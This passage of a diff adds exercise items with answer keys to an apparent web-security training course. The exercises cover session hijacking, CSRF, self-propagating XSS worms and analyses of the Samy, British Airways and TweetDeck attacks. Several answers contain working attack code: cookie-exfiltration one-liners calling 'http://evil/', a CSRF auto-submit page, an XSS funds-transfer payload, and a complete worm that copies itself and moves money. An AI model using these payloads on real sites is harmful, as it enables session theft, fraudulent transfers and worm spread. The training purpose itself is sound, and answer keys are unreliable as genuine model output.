+          "expected_output": "1: Same session from different IP addresses, 2: Sudden location change, 3: User-Agent string changes, 4: Activity during unusual hours, 5: Actions the user denies making",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: 1: Same session from different IP addresses, 2: Sudden location change, 3: User-..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_17",
+          "title": "Exercise 17: Fix Cookie Configuration",
+          "description": "Make this cookie setup secure.",
+          "difficulty": "intermediate",
+          "category": "Cookie Theft & Session Hijacking",
+          "estimated_minutes": 7,
+          "ai_intro": "Let's work on Cookie Theft & Session Hijacking! This exercise builds your understanding step by step.",
+          "starter_code": "// VULNERABLE:\nCookie session = new Cookie(\"JSESSIONID\", id);\nresponse.addCookie(session);\n\n// TODO: Add the missing security configurations:\nCookie session = new Cookie(\"JSESSIONID\", id);\n// Add lines here:\n___\nresponse.addCookie(session);",
+          "expected_output": "session.setHttpOnly(true); session.setSecure(true); session.setMaxAge(1800);",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: session.setHttpOnly(true); session.setSecure(true); session.setMaxAge(1800);..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_18",
+          "title": "Exercise 18: Session Fixation vs Hijacking",
+          "description": "Explain the difference between these two session attacks.",
+          "difficulty": "advanced",
+          "category": "Cookie Theft & Session Hijacking",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on Cookie Theft & Session Hijacking! This exercise builds your understanding step by step.",
+          "starter_code": "// TODO: Fill in the comparison:\n// Session Fixation:\n//   When: ___ (before or after login?)\n//   How: ___\n//   Defence: ___\n\n// Session Hijacking:\n//   When: ___ (before or after login?)\n//   How: ___\n//   Defence: ___",
+          "expected_output": "Fixation: before login, attacker sets session ID then waits for victim to login, defence: regenerate session on login. Hijacking: after login, attacker steals existing session, defence: HttpOnly + Secure cookies",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: Fixation: before login, attacker sets session ID then waits for victim to login,..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_19",
+          "title": "Exercise 19: Multiple Cookie Exfiltration Methods",
+          "description": "Write 3 different ways to send a cookie to a remote server.",
+          "difficulty": "advanced",
+          "category": "Cookie Theft & Session Hijacking",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on Cookie Theft & Session Hijacking! This exercise builds your understanding step by step.",
+          "starter_code": "// Method 1 (Image):\n// ___\n\n// Method 2 (Fetch):\n// ___\n\n// Method 3 (Beacon):\n// ___\n\n// Which method is hardest to block? ___",
+          "expected_output": "1: new Image().src='http://evil/?c='+document.cookie 2: fetch('http://evil/?c='+document.cookie) 3: navigator.sendBeacon('http://evil/',document.cookie) / Beacon is hardest — designed for analytics, often allowed by CSP",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: 1: new Image().src='http://evil/?c='+document.cookie 2: fetch('http://evil/?c='+..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_20",
+          "title": "Exercise 20: Cross-Session Verification",
+          "description": "Prove that two stolen cookies belong to different users.",
+          "difficulty": "advanced",
+          "category": "Cookie Theft & Session Hijacking",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on Cookie Theft & Session Hijacking! This exercise builds your understanding step by step.",
+          "starter_code": "// Cookie A: JSESSIONID=node016d4qjfmxsbiz\n// Cookie B: JSESSIONID=node01ph030it0lu6o\n\n// TODO: How do you verify these are different users?\n// Step 1: curl with cookie A → check ___ page → note ___\n// Step 2: curl with cookie B → check ___ page → note ___\n// Step 3: Compare ___",
+          "expected_output": "Step 1: curl /account with A → note username and balance. Step 2: curl /account with B → note username and balance. Step 3: Compare — different usernames confirm different users",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: Step 1: curl /account with A → note username and balance. Step 2: curl /account ..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_21",
+          "title": "Exercise 21: Identify Missing CSRF Protection",
+          "description": "Check if this form is vulnerable to CSRF.",
+          "difficulty": "intermediate",
+          "category": "CSRF & Silent Actions",
+          "estimated_minutes": 7,
+          "ai_intro": "Let's work on CSRF & Silent Actions! This exercise builds your understanding step by step.",
+          "starter_code": "// Transfer form HTML:\n<form action=\"/transfer\" method=\"POST\">\n  <input name=\"to\" type=\"text\">\n  <input name=\"transferAmount\" type=\"text\">\n  <button type=\"submit\">Transfer</button>\n</form>\n\n// TODO: Is this form vulnerable to CSRF? Why?\n// Answer: ___\n// What's missing: ___",
+          "expected_output": "YES — no hidden csrf_token field. Any page can submit a POST to /transfer and the server will accept it.",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: YES — no hidden csrf_token field. Any page can submit a POST to /transfer and th..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_22",
+          "title": "Exercise 22: Write a CSRF Attack Page",
+          "description": "Create an HTML file that auto-submits a hidden transfer.",
+          "difficulty": "intermediate",
+          "category": "CSRF & Silent Actions",
+          "estimated_minutes": 7,
+          "ai_intro": "Let's work on CSRF & Silent Actions! This exercise builds your understanding step by step.",
+          "starter_code": "// TODO: Complete the attack page:\n<html><body>\n<h1>You won a free iPhone!</h1>\n<form id=\"csrf\" action=\"___\" method=\"___\">\n  <input type=\"hidden\" name=\"to\" value=\"___\">\n  <input type=\"hidden\" name=\"transferAmount\" value=\"___\">\n</form>\n<script>___</script>\n</body></html>",
+          "expected_output": "action='http://localhost:15000/transfer' method='POST' / value='999999' / value='500' / document.getElementById('csrf').submit();",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: action='http://localhost:15000/transfer' method='POST' / value='999999' / value=..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_23",
+          "title": "Exercise 23: XMLHttpRequest vs Form Submit",
+          "description": "Explain why XHR is better than form submission for CSRF.",
+          "difficulty": "intermediate",
+          "category": "CSRF & Silent Actions",
+          "estimated_minutes": 7,
+          "ai_intro": "Let's work on CSRF & Silent Actions! This exercise builds your understanding step by step.",
+          "starter_code": "// Method 1: Hidden form\n// document.forms[0].submit();\n\n// Method 2: XMLHttpRequest\n// var x = new XMLHttpRequest();\n// x.open('POST', '/transfer', false);\n// x.send('to=999999&amount=500');\n\n// TODO: List 3 advantages of XHR over form submit:\n// 1: ___\n// 2: ___\n// 3: ___",
+          "expected_output": "1: No page redirect (silent), 2: No nested form issues, 3: Can set custom headers",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: 1: No page redirect (silent), 2: No nested form issues, 3: Can set custom header..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_24",
+          "title": "Exercise 24: CSRF + XSS Combined Attack",
+          "description": "Write a payload that chains XSS and CSRF together.",
+          "difficulty": "intermediate",
+          "category": "CSRF & Silent Actions",
+          "estimated_minutes": 7,
+          "ai_intro": "Let's work on CSRF & Silent Actions! This exercise builds your understanding step by step.",
+          "starter_code": "// TODO: Write a stored XSS payload that silently transfers funds:\n<script>\n// Create XMLHttpRequest:\nvar x = ___;\n// Open POST to transfer:\nx.open(___);\n// Set content type:\nx.setRequestHeader(___);\n// Send transfer:\nx.send(___);\n</script>",
+          "expected_output": "var x = new XMLHttpRequest(); / x.open('POST','/transfer',false); / x.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); / x.send('to=999999&transferAmount=500');",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: var x = new XMLHttpRequest(); / x.open('POST','/transfer',false); / x.setRequest..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_25",
+          "title": "Exercise 25: Why Same-Origin Allows CSRF",
+          "description": "Explain why the browser allows XSS scripts to make requests.",
+          "difficulty": "intermediate",
+          "category": "CSRF & Silent Actions",
+          "estimated_minutes": 7,
+          "ai_intro": "Let's work on CSRF & Silent Actions! This exercise builds your understanding step by step.",
+          "starter_code": "// The XSS script runs on http://bank.com\n// It makes a request to http://bank.com/transfer\n\n// TODO: Why doesn't Same-Origin Policy block this?\n// Answer: ___\n\n// Would SOP block a request to http://evil.com?\n// Answer: ___",
+          "expected_output": "SOP allows requests to the SAME origin — the XSS runs ON bank.com so requests to bank.com are allowed. YES, SOP would block requests to evil.com (different origin).",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: SOP allows requests to the SAME origin — the XSS runs ON bank.com so requests to..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_26",
+          "title": "Exercise 26: Implement CSRF Token Validation",
+          "description": "Add server-side CSRF token checking.",
+          "difficulty": "intermediate",
+          "category": "CSRF & Silent Actions",
+          "estimated_minutes": 7,
+          "ai_intro": "Let's work on CSRF & Silent Actions! This exercise builds your understanding step by step.",
+          "starter_code": "// TODO: Complete the server-side validation:\nprotected void doPost(HttpServletRequest req, HttpServletResponse resp) {\n    String submitted = req.getParameter(\"___\");\n    String expected = (String) req.getSession().getAttribute(\"___\");\n    \n    if (submitted == null || !submitted.___(expected)) {\n        resp.sendError(___, \"Invalid CSRF token\");\n        return;\n    }\n    // Process the transfer...\n}",
+          "expected_output": "csrf_token / csrf_token / equals / 403",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: csrf_token / csrf_token / equals / 403..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_27",
+          "title": "Exercise 27: Generate Unique CSRF Tokens",
+          "description": "Write code to generate and store a CSRF token.",
+          "difficulty": "intermediate",
+          "category": "CSRF & Silent Actions",
+          "estimated_minutes": 7,
+          "ai_intro": "Let's work on CSRF & Silent Actions! This exercise builds your understanding step by step.",
+          "starter_code": "// TODO: Generate a unique token:\nimport java.util.UUID;\n\nString token = ___;\nsession.setAttribute(\"csrf_token\", token);\n\n// Include in HTML form:\nout.println(\"<input type='hidden' name='csrf_token' value='\" + ___ + \"'>\");",
+          "expected_output": "UUID.randomUUID().toString() / token",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: UUID.randomUUID().toString() / token..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_28",
+          "title": "Exercise 28: Double Submit Cookie Pattern",
+          "description": "Implement an alternative CSRF defence without server state.",
+          "difficulty": "advanced",
+          "category": "CSRF & Silent Actions",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on CSRF & Silent Actions! This exercise builds your understanding step by step.",
+          "starter_code": "// TODO: Explain how Double Submit Cookie works:\n// Step 1: Server sets a random cookie: ___\n// Step 2: JavaScript reads cookie and puts it in: ___\n// Step 3: Server compares: ___\n// Why it works: ___",
+          "expected_output": "Step 1: Set-Cookie: csrf=random123. Step 2: JS reads document.cookie and adds hidden form field. Step 3: Server compares cookie value with form field value. Works because: attacker can't read the cookie from a different origin.",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: Step 1: Set-Cookie: csrf=random123. Step 2: JS reads document.cookie and adds hi..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_29",
+          "title": "Exercise 29: SameSite Cookie Defence",
+          "description": "Explain how SameSite cookies prevent CSRF.",
+          "difficulty": "advanced",
+          "category": "CSRF & Silent Actions",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on CSRF & Silent Actions! This exercise builds your understanding step by step.",
+          "starter_code": "// TODO: Fill in the SameSite comparison:\n// SameSite=Strict: ___\n// SameSite=Lax: ___\n// SameSite=None: ___\n\n// Which one prevents CSRF from external sites? ___\n// Which one allows normal link navigation? ___",
+          "expected_output": "Strict: cookie NEVER sent cross-site. Lax: cookie sent with GET navigations but NOT POST. None: always sent (no protection). Strict prevents CSRF. Lax allows navigation.",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: Strict: cookie NEVER sent cross-site. Lax: cookie sent with GET navigations but ..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_30",
+          "title": "Exercise 30: Test CSRF Protection",
+          "description": "Write a test plan to verify CSRF tokens are working.",
+          "difficulty": "advanced",
+          "category": "CSRF & Silent Actions",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on CSRF & Silent Actions! This exercise builds your understanding step by step.",
+          "starter_code": "// TODO: Write 5 CSRF test cases:\n// Test 1: Submit form normally → expect: ___\n// Test 2: Submit form without token → expect: ___\n// Test 3: Submit form with wrong token → expect: ___\n// Test 4: Submit via XHR without token → expect: ___\n// Test 5: Reuse old token from expired session → expect: ___",
+          "expected_output": "1: Success (200), 2: Rejected (403), 3: Rejected (403), 4: Rejected (403), 5: Rejected (403)",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: 1: Success (200), 2: Rejected (403), 3: Rejected (403), 4: Rejected (403), 5: Re..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_31",
+          "title": "Exercise 31: Build a Self-Reading Script",
+          "description": "Write a script that reads and displays its own source code.",
+          "difficulty": "advanced",
+          "category": "Self-Replication & Worms",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on Self-Replication & Worms! This exercise builds your understanding step by step.",
+          "starter_code": "// TODO: Complete the self-reading script:\n<script id=\"___\">\n  var tag = '<script id=\"clone\">';\n  var body = document.getElementById('___').___ ;\n  var end = '___';\n  alert(tag + body + end);\n</script>",
+          "expected_output": "id='clone' / 'clone' / innerHTML / '</' + 'script>'",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: id='clone' / 'clone' / innerHTML / '</' + 'script>'..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_32",
+          "title": "Exercise 32: Why Split the End Tag?",
+          "description": "Explain why '</script>' must be split.",
+          "difficulty": "advanced",
+          "category": "Self-Replication & Worms",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on Self-Replication & Worms! This exercise builds your understanding step by step.",
+          "starter_code": "// This BREAKS:\n<script>\n  var end = '</script>';  // ← Parser sees this as end of script!\n  alert(end);\n</script>\n\n// This WORKS:\n<script>\n  var end = '</' + 'script>';\n  alert(end);\n</script>\n\n// TODO: Why does splitting fix it?\n// Answer: ___",
+          "expected_output": "The HTML parser processes tags BEFORE JavaScript runs. It sees </script> and thinks the script block ends there. Concatenation '</' + 'script>' produces the same string at runtime but doesn't match the parser's pattern.",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: The HTML parser processes tags BEFORE JavaScript runs. It sees </script> and thi..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_33",
+          "title": "Exercise 33: Worm Propagation Function",
+          "description": "Write the function that copies the worm to another profile.",
+          "difficulty": "advanced",
+          "category": "Self-Replication & Worms",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on Self-Replication & Worms! This exercise builds your understanding step by step.",
+          "starter_code": "// Worm clone is stored in variable 'clone'\n// The app has a function ajaxSyncRequest(url, data)\n\n// TODO: Write the propagation call:\n// ___\n\n// Why use ajaxSyncRequest instead of raw XHR?\n// Answer: ___",
+          "expected_output": "ajaxSyncRequest('/account', clone); / It handles encoding correctly — raw XHR with encodeURIComponent would turn <script> into %3Cscript%3E which won't execute",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: ajaxSyncRequest('/account', clone); / It handles encoding correctly — raw XHR wi..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_34",
+          "title": "Exercise 34: Fix URL-Encoding Problem",
+          "description": "The worm payload gets URL-encoded and stops working. Fix it.",
+          "difficulty": "advanced",
+          "category": "Self-Replication & Worms",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on Self-Replication & Worms! This exercise builds your understanding step by step.",
+          "starter_code": "// PROBLEM: Profile shows %3Cscript%3E instead of <script>\n// This happens because encodeURIComponent() was used:\nxhr.send('description=' + encodeURIComponent(wormCode));\n\n// TODO: How to fix this? (2 methods)\n// Method 1: ___\n// Method 2: ___",
+          "expected_output": "Method 1: Use the app's own profile update function (ajaxSyncRequest). Method 2: Use FormData object which handles encoding differently.",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: Method 1: Use the app's own profile update function (ajaxSyncRequest). Method 2:..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_35",
+          "title": "Exercise 35: Calculate Worm Spread Rate",
+          "description": "Model exponential propagation.",
+          "difficulty": "advanced",
+          "category": "Self-Replication & Worms",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on Self-Replication & Worms! This exercise builds your understanding step by step.",
+          "starter_code": "// Each infected user infects 2 new users per hour.\n// Starting with 1 infected user at hour 0.\n\n// TODO: Fill in the spread:\n// Hour 0: ___ infected\n// Hour 1: ___ infected\n// Hour 5: ___ infected\n// Hour 10: ___ infected\n// Hour 20: ___ infected\n\n// Formula: 2^hour = ___",
+          "expected_output": "1, 2, 32, 1024, 1048576 (over 1 million) / 2^n = number infected after n hours",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: 1, 2, 32, 1024, 1048576 (over 1 million) / 2^n = number infected after n hours..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_36",
+          "title": "Exercise 36: Worm Payload Design",
+          "description": "Design a worm that adds a message to every profile AND transfers funds.",
+          "difficulty": "advanced",
+          "category": "Self-Replication & Worms",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on Self-Replication & Worms! This exercise builds your understanding step by step.",
+          "starter_code": "// TODO: Write the complete worm with 3 components:\n<script id=\"w\">\n  // 1. Clone:\n  ___\n  // 2. Transfer 100$ to card 999999:\n  ___\n  // 3. Propagate to victim's profile:\n  ___\n</script>",
+          "expected_output": "1: var c='<script id=\"w\">'+document.getElementById('w').innerHTML+'</'+'script>'; 2: var x=new XMLHttpRequest();x.open('POST','/transfer',false);x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');x.send('to=999999&transferAmount=100'); 3: ajaxSyncRequest('/account',c);",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: 1: var c='<script id=\"w\">'+document.getElementById('w').innerHTML+'</'+'script>'..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_37",
+          "title": "Exercise 37: Worm with Conditional Execution",
+          "description": "Make the worm only execute once per user.",
+          "difficulty": "advanced",
+          "category": "Self-Replication & Worms",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on Self-Replication & Worms! This exercise builds your understanding step by step.",
+          "starter_code": "// PROBLEM: Worm runs every time user visits ANY infected page\n// This transfers money multiple times from the same user!\n\n// TODO: Add a check so it only runs once:\n<script id=\"w\">\n  if (!document.cookie.includes('___')) {\n    document.cookie = '___';\n    // ... worm payload ...\n  }\n</script>",
+          "expected_output": "if (!document.cookie.includes('wormed=true')) { document.cookie='wormed=true;path=/'; ... } — the cookie flag prevents re-execution",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: if (!document.cookie.includes('wormed=true')) { document.cookie='wormed=true;pat..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_38",
+          "title": "Exercise 38: Detect a Worm in Progress",
+          "description": "As a defender, how would you spot a worm spreading?",
+          "difficulty": "advanced",
+          "category": "Self-Replication & Worms",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on Self-Replication & Worms! This exercise builds your understanding step by step.",
+          "starter_code": "// TODO: List 5 signs of a worm spreading through your app:\n// 1: Database sign: ___\n// 2: Network sign: ___\n// 3: User sign: ___\n// 4: Log sign: ___\n// 5: Performance sign: ___",
+          "expected_output": "1: Many profiles suddenly have identical content. 2: Spike in POST requests to /account. 3: Users report changed profiles. 4: Logs show rapid sequential profile updates. 5: Server load increases exponentially.",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: 1: Many profiles suddenly have identical content. 2: Spike in POST requests to /..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_39",
+          "title": "Exercise 39: Stop a Worm Emergency",
+          "description": "Write an incident response plan for an active worm.",
+          "difficulty": "advanced",
+          "category": "Self-Replication & Worms",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on Self-Replication & Worms! This exercise builds your understanding step by step.",
+          "starter_code": "// The worm is spreading NOW. What do you do?\n// TODO: Order these actions (1=first, 6=last):\n// ___ Block the XSS input (output encoding)\n// ___ Clean infected profiles in database\n// ___ Identify the initial injection point\n// ___ Take the profile feature offline temporarily\n// ___ Invalidate all active sessions\n// ___ Deploy CSP header to block inline scripts",
+          "expected_output": "1: Take profile feature offline (stop spread). 2: Deploy CSP (prevent execution). 3: Invalidate sessions (stop hijacking). 4: Identify injection point. 5: Clean database. 6: Fix code with output encoding, then restore.",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: 1: Take profile feature offline (stop spread). 2: Deploy CSP (prevent execution)..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_40",
+          "title": "Exercise 40: Build an Anti-Worm Defence",
+          "description": "Write code that detects and blocks worm-like profile updates.",
+          "difficulty": "advanced",
+          "category": "Self-Replication & Worms",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on Self-Replication & Worms! This exercise builds your understanding step by step.",
+          "starter_code": "// TODO: Write a validation function for profile descriptions:\npublic boolean isWormLike(String description) {\n    // Check 1: Contains script tags?\n    if (description.matches(\"___\")) return true;\n    // Check 2: Contains event handlers?\n    if (description.matches(\"___\")) return true;\n    // Check 3: Suspiciously long?\n    if (description.length() > ___) return true;\n    return false;\n}",
+          "expected_output": ".*<script.*>.* / .*on(load|error|click|mouseover)=.* / 1000 (or similar reasonable limit)",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: .*<script.*>.* / .*on(load|error|click|mouseover)=.* / 1000 (or similar reasonab..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_41",
+          "title": "Exercise 41: Samy Worm Timeline",
+          "description": "Reconstruct the Samy worm's propagation timeline.",
+          "difficulty": "advanced",
+          "category": "Real-World Attack Analysis",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on Real-World Attack Analysis! This exercise builds your understanding step by step.",
+          "starter_code": "// TODO: Fill in the timeline:\n// 2005-10-04 00:00 — ___ profiles infected\n// 2005-10-04 01:00 — ___ friends added\n// 2005-10-04 08:00 — ~___ profiles\n// 2005-10-04 13:00 — ~___ profiles\n// 2005-10-04 20:00 — ~___ profiles\n// 2005-10-04 21:00 — MySpace ___",
+          "expected_output": "1 / 73 / 6000 / 200000 / 1000000 / taken offline",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: 1 / 73 / 6000 / 200000 / 1000000 / taken offline..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_42",
+          "title": "Exercise 42: Samy Worm Technical Analysis",
+          "description": "Identify the vulnerabilities that enabled the Samy worm.",
+          "difficulty": "advanced",
+          "category": "Real-World Attack Analysis",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on Real-World Attack Analysis! This exercise builds your understanding step by step.",
+          "starter_code": "// TODO: List the 4 vulnerabilities Samy exploited:\n// 1: ___ (CWE-___)\n// 2: ___ (CWE-___)\n// 3: ___ (CWE-___)\n// 4: ___ (CWE-___)",
+          "expected_output": "1: Stored XSS (CWE-79), 2: No CSRF tokens (CWE-352), 3: No output encoding, 4: No Content Security Policy",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: 1: Stored XSS (CWE-79), 2: No CSRF tokens (CWE-352), 3: No output encoding, 4: N..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_43",
+          "title": "Exercise 43: British Airways Attack Chain",
+          "description": "Map the BA payment page attack.",
+          "difficulty": "advanced",
+          "category": "Real-World Attack Analysis",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on Real-World Attack Analysis! This exercise builds your understanding step by step.",
+          "starter_code": "// TODO: Draw the attack chain:\n// Step 1: Attackers compromised ___\n// Step 2: Injected ___ lines of JavaScript into ___\n// Step 3: Script captured ___ from the payment form\n// Step 4: Data sent to ___ (lookalike domain)\n// Step 5: Attack lasted ___ days\n// Step 6: ___ cards stolen\n// Step 7: Fine: ___",
+          "expected_output": "1: third-party script. 2: 22 lines, payment page. 3: card number, expiry, CVV. 4: baways.com. 5: 15 days. 6: 380,000. 7: 20 million pounds",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: 1: third-party script. 2: 22 lines, payment page. 3: card number, expiry, CVV. 4..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_44",
+          "title": "Exercise 44: BA Defence Analysis",
+          "description": "What defences would have stopped the BA breach?",
+          "difficulty": "advanced",
+          "category": "Real-World Attack Analysis",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on Real-World Attack Analysis! This exercise builds your understanding step by step.",
+          "starter_code": "// TODO: For each defence, explain how it would have helped:\n// CSP header: ___\n// Subresource Integrity (SRI): ___\n// Input monitoring: ___\n// Payment tokenisation: ___",
+          "expected_output": "CSP: would block data exfiltration to baways.com. SRI: would detect the modified third-party script. Monitoring: would detect unusual outbound requests. Tokenisation: card data never reaches the browser.",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: CSP: would block data exfiltration to baways.com. SRI: would detect the modified..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_45",
+          "title": "Exercise 45: TweetDeck Worm (2014)",
+          "description": "Analyse the TweetDeck XSS worm.",
+          "difficulty": "advanced",
+          "category": "Real-World Attack Analysis",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on Real-World Attack Analysis! This exercise builds your understanding step by step.",
+          "starter_code": "// In 2014, a worm spread via TweetDeck (Twitter client)\n// The payload was: <script class='xss'>$('.xss').parents().eq(1).find('a').eq(1).click();$('[data-action=retweet]').click();alert('XSS')</script>\n\n// TODO: What did this worm do?\n// Action 1: ___\n// Action 2: ___\n// How did it propagate: ___\n// How many retweets: ___",
+          "expected_output": "1: Retweeted itself automatically. 2: Showed alert. Propagated via retweets — every viewer's TweetDeck auto-retweeted it. Over 80,000 retweets.",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: 1: Retweeted itself automatically. 2: Showed alert. Propagated via retweets — ev..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_46",
